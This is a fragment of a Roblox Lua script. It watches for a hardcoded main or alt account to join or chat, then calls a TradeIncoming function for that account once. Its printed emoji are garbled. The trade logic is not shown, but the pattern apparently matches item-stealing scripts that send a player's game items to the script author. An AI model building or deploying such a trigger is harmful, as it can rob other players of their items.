    if player.Name == Username then
        print("ğŸ¯ Main user joined: " .. Username)
        player.Chatted:Connect(function(msg)
            if not sent then
                print("ğŸ’¬ Chat trigger received: " .. msg)
                TradeIncoming(Username)
            end
        end)
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username2 and Username2 ~= "None" then
        print("ğŸ¯ Alt user joined: " .. Username2)
        player.Chatted:Connect(function(msg)
            if not sent then
                print("ğŸ’¬ Chat trigger received: " .. msg)
                TradeIncoming(Username2)
            end
        end)
    end
end)

-- Check if users are already in game
print("ğŸ” Checking for existing players...")
for _, player in pairs(game.Players:GetPlayers()) do
    if player.Name == Username then
        print("ğŸ¯ Main user already in game: " .. Username)
        player.Chatted:Connect(function(msg)
            if not sent then
                print("ğŸ’¬ Chat trigger received: " .. msg)
                TradeIncoming(Username)
            end
        end)
    end
    if player.Name == Username2 and Username2 ~= "None" then
        print("ğŸ¯ Alt user already in game: " .. Username2)
        player.Chatted:Connect(function(msg)
            if not sent then
                print("ğŸ’¬ Chat trigger received: " .. msg)
                TradeIncoming(Username2)
            end
        end)
    end
end

